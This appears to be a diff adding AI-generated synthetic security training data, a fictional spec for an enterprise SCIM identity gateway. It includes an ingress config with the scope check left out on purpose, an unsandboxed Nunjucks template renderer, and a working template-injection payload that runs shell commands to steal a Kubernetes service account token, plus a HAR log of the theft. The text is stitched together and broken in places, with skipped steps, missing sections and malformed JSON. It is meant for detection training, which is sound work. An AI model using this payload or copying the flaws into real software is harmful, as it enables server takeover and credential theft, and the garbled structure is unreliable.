@@ -1,0 +1,246 @@
+========================================
+
+Here is the twentieth system, bringing us to a monumental milestone in this dataset. We are shifting into the **Cloud Identity & Access Management (IAM)** sector, focusing on an **Enterprise SCIM (System for Cross-domain Identity Management) API Gateway**.
+
+
+Here is **Part 1**. Type **c** when you are ready for Part 2.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** OptaSync Enterprise SCIM Gateway
+**Document Version:** 10.0.1 (FINAL)
+**Classification:** ENTERPRISE CONFIDENTIAL / IAM DIRECTORY SCOPE
+**Domain:** Identity & Access Management (IAM) / B2B SaaS / Directory Sync
+
+## 1.0 Executive Summary
+OptaSync is a B2B middleware platform that handles automated user provisioning. Large enterprises connect their primary Identity Providers (like Azure AD or Okta) to OptaSync via the SCIM 2.0 protocol. When an employee is hired or fired in the HR system, OptaSync automatically creates or deactivates their accounts across 50+ downstream SaaS applications (e.g., Salesforce, Slack, GitHub).
+
+To facilitate custom onboarding, OptaSync allows tenant administrators to configure automated "Welcome to the Company" emails that are triggered whenever a new user profile is provisioned. 
+
+## 2.0 Comprehensive Network Topology & Ingress Routing
+The platform processes millions of identity lifecycle events daily, relying on an asynchronous, event-driven architecture.
+
+### 2.1 The Cloud Ingress Boundary
+* **AWS API Gateway:** Terminates TLS and acts as the entry point for all SCIM API traffic (e.g., `/api/scim/v2/`).
+* **Kong Ingress Controller (EKS):** Routes traffic inside the Kubernetes cluster to specific microservices based on the URL path.
+
+### 2.2 The Internal Microservices (Python & Node.js)
+* **Directory Sync Service (Python/FastAPI):** Handles standard SCIM operations (`GET /Users`, `POST /Users`).
+* **Notification & Template Worker (Node.js):** Listens to a Kafka topic for `USER_CREATED` events. It fetches the tenant's custom HTML email template, compiles it using the **Nunjucks** templating engine to inject the user's name and department, and dispatches it via SendGrid.
+
+## 3.0 Identity, Roles, and RBAC Authorization
+Because OptaSync manages identity for entire enterprises, Role-Based Access Control (RBAC) must be flawless.
+
+### 3.1 OAuth 2.0 & Granular Scopes
+API access requires a Bearer token issued by the OptaSync authorization server. 
+* **Standard Scope:** `scim.user.read` (Allows a user to view their own synced profile).
+* **Admin Scope:** `scim.tenant.manage` (Allows an IT admin to configure global sync rules and notification templates).
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The new feature allowing admins to "preview" their custom Nunjucks email templates via an API call was merged quickly to meet a Q1 product deadline. The Kong Ingress routing rules for this specific endpoint were configured manually rather than via the standard Terraform RBAC module. Tracked as RISK-IAM-412.*
+
+**Taxonomy Pattern:** 1.2 (Broken Function Level Authorization) & 7.3 (Server-Side Template Injection)
+**Sub-system:** Notification Service (`POST /api/scim/v2/Tenants/{tenant_id}/Notifications/PreviewTemplate`)
+
+**The Deep Architectural Flaw:**
+This attack exploits a failure in API gateway routing and unsafe string evaluation in the backend.
+1.  **Broken Function Level Authorization (Pattern 1.2):** The API endpoint intended for previewing email templates is strictly an administrative function. However, the Kong API Gateway routing rule for `/api/scim/v2/Tenants/*/Notifications/*` was misconfigured. It verifies that the user provides a *valid* token, but it **completely fails to check if the token contains the `scim.tenant.manage` scope**. Any authenticated user (even a standard employee with `scim.user.read`) can successfully invoke this administrative endpoint.
+2.  **Server-Side Template Injection (Pattern 7.3):** The backend Node.js microservice takes the `html_body` parameter supplied in the API request and compiles it using Nunjucks (a powerful JavaScript templating engine) to render a preview. The developers failed to implement a secure sandbox environment for the Nunjucks renderer. Because the engine allows access to the global Node.js context via the `range.constructor` object traversal trick, an attacker can break out of the template string and execute arbitrary operating system commands.
+
+1.  **The Foothold:** An attacker (a low-level employee at a client company) logs into the OptaSync self-service portal and captures their standard OAuth Bearer token.
+4.  **The Execution:** The Node.js worker receives the payload and passes it to `nunjucks.renderString()`. The templating engine evaluates the malicious tag, traversing up to the Node.js global context, importing the `child_process` module, and executing a reverse shell or reading sensitive environment variables.
+
+***
+
+
+
+***
+
+**Document Version:** 4.1.2
+**Applies to Architecture:** OptaSync Enterprise SCIM Gateway v10.0.1
+
+
+```yaml
+# File: kong-scim-ingress.yaml
+_format_version: "2.1"
+services:
+  - name: directory-sync-service
+    url: http://directory-sync.internal:8000
+    routes:
+      - name: get-users-route
+        paths:
+          - /api/scim/v2/Users
+        plugins:
+          - name: oauth2-introspection
+            config:
+              introspection_endpoint: "https://auth.optasync.com/oauth2/introspect"
+              # CORRECT: Enforces standard user scope
+              required_scopes: ["scim.user.read"] 
+
+  - name: notification-worker-service
+    url: http://notification-worker.internal:3000
+    routes:
+      - name: template-preview-route
+        paths:
+          - /api/scim/v2/Tenants/(?<tenant_id>\w+)/Notifications/PreviewTemplate
+        plugins:
+          - name: oauth2-introspection
+            config:
+              introspection_endpoint: "https://auth.optasync.com/oauth2/introspect"
+              # The 'required_scopes' array is completely missing. 
+              # The plugin verifies the token signature is valid, but allows ANY user 
+              # (even those with only 'scim.user.read') to access this admin-only function.
+```
+
+## 6.0 The Flawed Implementation (Node.js / Nunjucks)
+Once the low-privileged attacker bypasses the API Gateway, their request hits the Notification Worker. This microservice parses the supplied template string and attempts to render it using Nunjucks. 
+
+```javascript
+// File: controllers/templateController.js
+const nunjucks = require('nunjucks');
+
+// Configure Nunjucks environment (Flawed Configuration)
+const env = new nunjucks.Environment();
+// SECURITY FLAW: autoescape is false, and no sandbox or custom loader is utilized.
+
+// POST /api/scim/v2/Tenants/:tenant_id/Notifications/PreviewTemplate
+exports.previewTemplate = async (req, res) => {
+    const { html_body, mock_user_data } = req.body;
+    
+    // Note: The tenant_id boundary check is assumed to pass because the attacker 
+    // is a valid user of this tenant, they just lack the admin role.
+
+    try {
+        // The service takes the raw, unescaped 'html_body' string directly from the API request
+        // and evaluates it using the templating engine. Nunjucks allows access to the JavaScript
+        // prototype chain. An attacker can break out of the template syntax and execute raw Node.js code.
+        
+        const renderedOutput = env.renderString(html_body, {
+            user: mock_user_data || { first_name: "John", last_name: "Doe", department: "Engineering" }
+        });
+
+        // Returns the compiled (or exploited) output back to the API caller
+        res.status(200).json({
+            status: "RENDER_SUCCESS",
+            preview_html: renderedOutput
+        });
+
+    } catch (error) {
+        res.status(400).json({ error: "Template compilation failed." });
+    }
+};
+```
+
+This contract highlights how an attacker utilizes a complex prototype pollution/sandbox escape payload to transform a benign email formatting feature into a remote command execution vector.
+
+### 7.1 Intended Safe Payload (Legitimate IT Admin)
+An IT administrator tests their new welcome email template to ensure the dynamic tags compile correctly.
+
+**Target URI:** `POST /api/scim/v2/Tenants/t_88192/Notifications/PreviewTemplate`
+**Expected Request Payload:**
+```json
+{
+  "template_name": "Welcome Email Q3",
+  "html_body": "<html><body><h1>Welcome to the team, {{ user.first_name }}!</h1><p>Your department is {{ user.department }}.</p></body></html>",
+  "mock_user_data": {
+    "first_name": "Jane",
+    "department": "Marketing"
+  }
+}
+```
+*Behavior:* Returns standard HTML: `<html><body><h1>Welcome to the team, Jane!</h1>...`
+
+A low-privileged user connects to the admin endpoint and injects a Node.js global context escape payload into the template field.
+
+**Target URI:** `POST /api/scim/v2/Tenants/t_88192/Notifications/PreviewTemplate`
+**Malicious Request Payload:**
+```json
+{
+  "html_body": "{{ range.constructor(\"return global.process.mainModule.require('child_process').execSync('cat /var/run/secrets/kubernetes.io/serviceaccount/token').toString()\")() }}",
+  "mock_user_data": {}
+}
+```
+*Behavior:* 1. The Kong API Gateway lets it through because it only checks if the token is valid, not if it has admin scopes.
+2. The Node.js application passes the payload to Nunjucks.
+3. Nunjucks evaluates `range.constructor(...)`. This traverses the prototype chain up to the global Node.js `Function` constructor. 
+4. It dynamically builds and executes a function that imports the native `child_process` module.
+5. The `execSync` command executes `cat /var/run/secrets/kubernetes.io/serviceaccount/token` on the underlying container OS.
+6. The compiled "template" output now contains the highly privileged Kubernetes service account JWT, which is returned in the HTTP response.
+
+***
+
+**Part 3: Synthetic Telemetry Artifact (HAR Trace) & Deep Analysis**
+
+***
+
+**Applies to Architecture:** OptaSync Enterprise SCIM Gateway v10.0.1
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 1.2 & Pattern 7.3)
+
+
+
+```json
+{
+  "log": {
+    "version": "1.2",
+    "creator": {
+      "name": "AWS API Gateway / EKS Ingress Logs",
+      "version": "1.18.0"
+    },
+    "entries": [
+      {
+        "startedDateTime": "2026-04-09T07:17:48.112Z",
+        "time": 245,
+        "request": {
+          "method": "POST",
+          "url": "https://api.optasync.com/api/scim/v2/Tenants/t_88192/Notifications/PreviewTemplate",
+          "httpVersion": "HTTP/2.0",
+          "headers": [
+            { "name": ":authority", "value": "api.optasync.com" },
+            { "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1XzM4OTExIiwic2NvcGVzIjpbInNjaW0udXNlci5yZWFkIl0sInRlbmFudCI6InRfODgxOTIifQ..." },
+            { "name": "content-type", "value": "application/json" },
+            { "name": "user-agent", "value": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36" }
+          ],
+          "queryString": [],
+          "postData": {
+            "mimeType": "application/json",
+          },
+          "bodySize": 248
+        },
+        "response": {
+          "status": 200,
+          "statusText": "OK",
+          "headers": [
+            { "name": "content-type", "value": "application/json" },
+            { "name": "x-worker-node", "value": "ip-10-44-2-19.ec2.internal" }
+          ],
+          "content": {
+            "size": 1142,
+            "mimeType": "application/json",
+            "text": "{\"status\": \"RENDER_SUCCESS\", \"preview_html\": \"eyJhbGciOiJSUzI1NiIsImtpZCI6InB1YmxpYy1rZXkifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJvcHRhc3luYy1wcm9kIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZWNyZXQubmFtZSI6Im5vdGlmaWNhdGlvbi13b3JrZXItdG9rZW4teHl6Iiwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Om9wdGFzeW5jLXByb2Q6bm90aWZpY2F0aW9uLXdvcmtlciJ9...[TRUNCATED_K8S_JWT]...\"}"
+          },
+          "bodySize": 1142
+        }
+      }
+    ]
+  }
+}
+```
+
+***
+
+### Why this payload is critical for training a 3B model (Expanded Analysis):
+
+    * **Scope Extraction vs. URI Taxonomy:** The AI must decode the user's JWT in the `authorization` header to extract the `"scopes":["scim.user.read"]` claim. It must then evaluate the semantic intent of the URI (`/Tenants/t_88192/Notifications/PreviewTemplate`). 
+    * **The Anomaly:** The AI learns that an endpoint designed to configure tenant-wide notification templates is universally an administrative function. The fact that a token with merely `user.read` privileges receives a `200 OK` (rather than a `403 Forbidden`) confirms a failure in the API Gateway's RBAC/scope enforcement policies.
+
+    * **Syntax Recognition:** The model must be trained to identify the double-curly-brace syntax `{{ ... }}` embedded within JSON string values as the universal indicator of template evaluation (used by Nunjucks, Jinja2, Twig, etc.).
+    * **Sandbox Escape Signatures:** The AI should recognize `range.constructor(...)` and `global.process.mainModule` as highly specific JavaScript prototype traversal techniques. This teaches the model the difference between a benign template injection (e.g., `{{ 7 * 7 }}`) and a weaponized Sandbox Escape aiming for underlying OS access.
+
+3. **Kubernetes JWT Exfiltration:**
+    * **Response Body Analysis:** The model must examine the output of the "rendered" template in the `preview_html` field. Instead of HTML, it returns a massive Base64Url-encoded string.
+
+========================================
+========================================
+
+========================================
